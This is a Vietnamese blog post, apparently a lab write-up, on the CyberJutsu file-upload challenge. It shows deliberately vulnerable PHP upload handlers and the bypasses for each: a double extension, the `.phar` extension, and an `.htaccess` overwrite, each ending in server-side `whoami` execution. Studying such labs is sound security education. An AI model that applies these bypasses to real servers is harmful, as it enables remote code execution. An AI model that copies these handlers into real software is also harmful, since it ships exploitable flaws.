<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="CyberJutsu Upload File Challenge" /><meta property="og:locale" content="en" /><meta name="description" content="CyberJutsu UploadFile" /><meta property="og:description" content="CyberJutsu UploadFile" /><link rel="canonical" href="https://domiee13.github.io/posts/CyberJutsuUploadFile/" /><meta property="og:url" content="https://domiee13.github.io/posts/CyberJutsuUploadFile/" /><meta property="og:site_name" content="Domiee13" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-05-19T12:00:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="CyberJutsu Upload File Challenge" /><meta name="twitter:site" content="@domiee13" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-05-19T12:00:00+08:00","datePublished":"2022-05-19T12:00:00+08:00","description":"CyberJutsu UploadFile","headline":"CyberJutsu Upload File Challenge","mainEntityOfPage":{"@type":"WebPage","@id":"https://domiee13.github.io/posts/CyberJutsuUploadFile/"},"url":"https://domiee13.github.io/posts/CyberJutsuUploadFile/"}</script><title>CyberJutsu Upload File Challenge | Domiee13</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Domiee13"><meta name="application-name" content="Domiee13"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/avt.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Domiee13</a></div><div class="site-subtitle font-italic">H a h a h a h a</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/domiee13" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/domiee13" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['dungntt1309','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>CyberJutsu Upload File Challenge</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>CyberJutsu Upload File Challenge</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/domiee13">Nguyen Tran Tuan Dung</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1652932800" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-05-19 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1747 words"> <em>9 min</em> read</span></div></div></div><div class="post-content"><h1 id="cyberjutsu-uploadfile">CyberJutsu UploadFile</h1><hr /><h2 id="level-1"><span class="mr-2">Level 1</span><a href="#level-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Source code của level 1</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
    <span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>

    <span class="c1">// Create folder for each user</span>
    <span class="nb">session_start</span><span class="p">();</span>
    <span class="nv">$dir</span> <span class="o">=</span> <span class="s1">'upload/'</span> <span class="mf">.</span> <span class="nb">session_id</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$dir</span><span class="p">)</span> <span class="p">)</span>
        <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span>

    <span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"debug"</span><span class="p">]))</span> <span class="k">die</span><span class="p">(</span><span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">));</span>
    <span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"file"</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nv">$error</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
        <span class="nv">$success</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$dir</span> <span class="mf">.</span> <span class="s2">"/"</span> <span class="mf">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"file"</span><span class="p">][</span><span class="s2">"name"</span><span class="p">];</span>
            <span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"file"</span><span class="p">][</span><span class="s2">"tmp_name"</span><span class="p">],</span> <span class="nv">$file</span><span class="p">);</span>
            <span class="nv">$success</span> <span class="o">=</span> <span class="s1">'Successfully uploaded file at: &lt;a href="/'</span> <span class="mf">.</span> <span class="nv">$file</span> <span class="mf">.</span> <span class="s1">'"&gt;/'</span> <span class="mf">.</span> <span class="nv">$file</span> <span class="mf">.</span> <span class="s1">' &lt;/a&gt;'</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">catch</span><span class="p">(</span><span class="nc">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$error</span> <span class="o">=</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="nf">getMessage</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>Đoạn code trên sẽ thực hiện tạo một đường dẫn tạm thời bằng cách nối chuỗi “upload” với session id của người dùng. Biến $_FILES là một biến mảng toàn cục của PHP, lưu toàn bộ thông tin về file upload. Sau khi check xem <code class="language-plaintext highlighter-rouge">$_FILES["file"]</code> đã được khởi tạo chưa, chương trình sẽ lưu file trong thư mục tạm thời đã tạo ở trên và đưa ra đường link đến file vừa upload.</p><p>Tạo file test.php với nội dung</p><p><img data-src="/assets/img/cyberJutsuUploadFile/Untitled.png" alt="Untitled" data-proofer-ignore></p><p>Thực hiện upload file test.php, ta thấy trang web báo thành công và trả về đường link đến file vừa upload</p><p><img data-src="/assets/img/cyberJutsuUploadFile/Untitled%201.png" alt="Untitled" data-proofer-ignore></p><p>Click vào đường link trên, ta thấy file php được thực thi và trả về kết quả</p><p><img data-src="/assets/img/cyberJutsuUploadFile/Untitled%202.png" alt="Untitled" data-proofer-ignore></p><p>Thay đổi nội dung file, thực hiện upload và truy cập đường link, trang web trả về kết quả của câu lệnh <code class="language-plaintext highlighter-rouge">whoami</code></p><p><img data-src="/assets/img/cyberJutsuUploadFile/Untitled%203.png" alt="Untitled" data-proofer-ignore></p><p><img data-src="/assets/img/cyberJutsuUploadFile/Untitled%204.png" alt="Untitled" data-proofer-ignore></p><hr /><h2 id="level-2"><span class="mr-2">Level 2</span><a href="#level-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Source code của level 2:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
    <span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>

    <span class="c1">// Create folder for each user</span>
    <span class="nb">session_start</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'dir'</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'dir'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'upload/'</span> <span class="mf">.</span> <span class="nb">session_id</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="nv">$dir</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'dir'</span><span class="p">];</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$dir</span><span class="p">)</span> <span class="p">)</span>
        <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span>

    <span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"debug"</span><span class="p">]))</span> <span class="k">die</span><span class="p">(</span><span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">));</span>
    <span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"file"</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nv">$error</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
        <span class="nv">$success</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"file"</span><span class="p">][</span><span class="s2">"name"</span><span class="p">];</span>
            <span class="nv">$extension</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">"."</span><span class="p">,</span> <span class="nv">$filename</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$extension</span> <span class="o">===</span> <span class="s2">"php"</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">die</span><span class="p">(</span><span class="s2">"Hack detected"</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$dir</span> <span class="mf">.</span> <span class="s2">"/"</span> <span class="mf">.</span> <span class="nv">$filename</span><span class="p">;</span>
            <span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"file"</span><span class="p">][</span><span class="s2">"tmp_name"</span><span class="p">],</span> <span class="nv">$file</span><span class="p">);</span>
            <span class="nv">$success</span> <span class="o">=</span> <span class="s1">'Successfully uploaded file at: &lt;a href="/'</span> <span class="mf">.</span> <span class="nv">$file</span> <span class="mf">.</span> <span class="s1">'"&gt;/'</span> <span class="mf">.</span> <span class="nv">$file</span> <span class="mf">.</span> <span class="s1">' &lt;/a&gt;'</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">catch</span><span class="p">(</span><span class="nc">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$error</span> <span class="o">=</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="nf">getMessage</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>Đoạn code trên sẽ thực hiện tách tên file bằng hàm <a href="https://www.php.net/manual/en/function.explode.php">explode</a>. Hàm explode là một hàm xử lý chuỗi trong php, dùng để tách 1 chuỗi được phân tách với nhau bằng 1 kí tự (trong đoạn code trên là kí tự <code class="language-plaintext highlighter-rouge">"."</code> ) và trả về 1 mảng những chuỗi đã được phân tách. Ví dụ:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="nv">$a</span> <span class="o">=</span> <span class="s2">"he.llo.wor.ld"</span><span class="p">;</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nb">explode</span><span class="p">(</span><span class="s2">"."</span><span class="p">,</span><span class="nv">$a</span><span class="p">));</span>
<span class="c1">//Return array(4) {</span>
<span class="c1">//  [0]=&gt;</span>
<span class="c1">//  string(2) "he"</span>
<span class="c1">// [1]=&gt;</span>
<span class="c1">//string(3) "llo"</span>
<span class="c1">//[2]=&gt;</span>
<span class="c1">//string(3) "wor"</span>
<span class="c1">//[3]=&gt;</span>
<span class="c1">//string(2) "ld"</span>
<span class="c1">//}</span>
</pre></table></code></div></div><p>Sau khi tách chuỗi, chương trình sẽ check xem chuỗi ở vị trí thứ 1 trong mảng có phải .php không, nếu có sẽ dừng chương trình và in ra “Hack detected”</p><p>Bypass bằng cách thêm 1 đuôi file nữa vào (ở đây mình thêm đuôi .png) , khi này, mảng <code class="language-plaintext highlighter-rouge">$extension</code> sẽ có giá trị <code class="language-plaintext highlighter-rouge">[”ten_file”,”png”,”php”]</code> và biến <code class="language-plaintext highlighter-rouge">$extension</code> sẽ có giá trị “png”</p><p><img data-src="/assets/img/cyberJutsuUploadFile/Untitled%205.png" alt="Untitled" data-proofer-ignore></p><p>Upload file và truy cập đường dẫn</p><p><img data-src="/assets/img/cyberJutsuUploadFile/Untitled%206.png" alt="Untitled" data-proofer-ignore></p><p>Trang web hiển thị kết quả của câu lệnh <code class="language-plaintext highlighter-rouge">whoami</code></p><p><img data-src="/assets/img/cyberJutsuUploadFile/Untitled%207.png" alt="Untitled" data-proofer-ignore></p><hr /><h2 id="level-3"><span class="mr-2">Level 3</span><a href="#level-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Source code của level 3</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
    <span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>

    <span class="c1">// Create folder for each user</span>
    <span class="nb">session_start</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'dir'</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'dir'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'upload/'</span> <span class="mf">.</span> <span class="nb">session_id</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="nv">$dir</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'dir'</span><span class="p">];</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$dir</span><span class="p">)</span> <span class="p">)</span>
        <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span>

    <span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"debug"</span><span class="p">]))</span> <span class="k">die</span><span class="p">(</span><span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">));</span>
    <span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"file"</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nv">$error</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
        <span class="nv">$success</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"file"</span><span class="p">][</span><span class="s2">"name"</span><span class="p">];</span>
            <span class="nv">$extension</span> <span class="o">=</span> <span class="nb">end</span><span class="p">(</span><span class="nb">explode</span><span class="p">(</span><span class="s2">"."</span><span class="p">,</span> <span class="nv">$filename</span><span class="p">));</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$extension</span> <span class="o">===</span> <span class="s2">"php"</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">die</span><span class="p">(</span><span class="s2">"Hack detected"</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$dir</span> <span class="mf">.</span> <span class="s2">"/"</span> <span class="mf">.</span> <span class="nv">$filename</span><span class="p">;</span>
            <span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"file"</span><span class="p">][</span><span class="s2">"tmp_name"</span><span class="p">],</span> <span class="nv">$file</span><span class="p">);</span>
            <span class="nv">$success</span> <span class="o">=</span> <span class="s1">'Successfully uploaded file at: &lt;a href="/'</span> <span class="mf">.</span> <span class="nv">$file</span> <span class="mf">.</span> <span class="s1">'"&gt;/'</span> <span class="mf">.</span> <span class="nv">$file</span> <span class="mf">.</span> <span class="s1">' &lt;/a&gt;'</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">catch</span><span class="p">(</span><span class="nc">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$error</span> <span class="o">=</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="nf">getMessage</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>Đoạn code trên có phần tương tự với level 2, nhưng thay vì lấy đuôi file ở vị trí thứ 1 trong mảng như level 2 thì chương trình này sẽ lấy đuôi file cuối cùng</p><p>Bypass bằng cách sử dụng đuôi <code class="language-plaintext highlighter-rouge">.[phar](https://filegi.com/file-info/phar-3781/)</code></p><p><img data-src="/assets/img/cyberJutsuUploadFile/Untitled%208.png" alt="Untitled" data-proofer-ignore></p><p>Upload file đuôi phar</p><p><img data-src="/assets/img/cyberJutsuUploadFile/Untitled%209.png" alt="Untitled" data-proofer-ignore></p><p>Trang web hiển thị kết quả của câu lệnh <code class="language-plaintext highlighter-rouge">whoami</code></p><p><img data-src="/assets/img/cyberJutsuUploadFile/Untitled%2010.png" alt="Untitled" data-proofer-ignore></p><hr /><h2 id="level-4"><span class="mr-2">Level 4</span><a href="#level-4" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Source code của Level 4</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
    <span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>

    <span class="c1">// Create folder for each user</span>
    <span class="nb">session_start</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'dir'</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'dir'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'upload/'</span> <span class="mf">.</span> <span class="nb">session_id</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="nv">$dir</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'dir'</span><span class="p">];</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$dir</span><span class="p">)</span> <span class="p">)</span>
        <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span>

    <span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"debug"</span><span class="p">]))</span> <span class="k">die</span><span class="p">(</span><span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">));</span>
    <span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"file"</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nv">$error</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
        <span class="nv">$success</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"file"</span><span class="p">][</span><span class="s2">"name"</span><span class="p">];</span>
            <span class="nv">$extension</span> <span class="o">=</span> <span class="nb">end</span><span class="p">(</span><span class="nb">explode</span><span class="p">(</span><span class="s2">"."</span><span class="p">,</span> <span class="nv">$filename</span><span class="p">));</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$extension</span><span class="p">,</span> <span class="p">[</span><span class="s2">"php"</span><span class="p">,</span> <span class="s2">"phtml"</span><span class="p">,</span> <span class="s2">"phar"</span><span class="p">]))</span> <span class="p">{</span>
                <span class="k">die</span><span class="p">(</span><span class="s2">"Hack detected"</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$dir</span> <span class="mf">.</span> <span class="s2">"/"</span> <span class="mf">.</span> <span class="nv">$filename</span><span class="p">;</span>
            <span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"file"</span><span class="p">][</span><span class="s2">"tmp_name"</span><span class="p">],</span> <span class="nv">$file</span><span class="p">);</span>
            <span class="nv">$success</span> <span class="o">=</span> <span class="s1">'Successfully uploaded file at: &lt;a href="/'</span> <span class="mf">.</span> <span class="nv">$file</span> <span class="mf">.</span> <span class="s1">'"&gt;/'</span> <span class="mf">.</span> <span class="nv">$file</span> <span class="mf">.</span> <span class="s1">' &lt;/a&gt;'</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">catch</span><span class="p">(</span><span class="nc">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$error</span> <span class="o">=</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="nf">getMessage</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>Level này trang web sử dụng blacklist, nếu đường dẫn của file là <code class="language-plaintext highlighter-rouge">php</code>, <code class="language-plaintext highlighter-rouge">phtml</code>, <code class="language-plaintext highlighter-rouge">phar</code> thì chương trình sẽ dừng và in ra dòng chữ “Hack detected”</p><p>Bypass bằng cách ghi đè file .htaccess</p><p><img data-src="/assets/img/cyberJutsuUploadFile/Untitled%2011.png" alt="Untitled" data-proofer-ignore></p><p>Upload file <code class="language-plaintext highlighter-rouge">.htaccess</code> vừa tạo</p><p><img data-src="/assets/img/cyberJutsuUploadFile/Untitled%2012.png" alt="Untitled" data-proofer-ignore></p><p>Đổi đuôi file sang <code class="language-plaintext highlighter-rouge">php2</code> và tiến hành upload file</p><p><img data-src="/assets/img/cyberJutsuUploadFile/Untitled%2013.png" alt="Untitled" data-proofer-ignore></p><p>Trang web hiển thị kết quả câu lệnh <code class="language-plaintext highlighter-rouge">whoami</code></p><p><img data-src="/assets/img/cyberJutsuUploadFile/Untitled%2014.png" alt="Untitled" 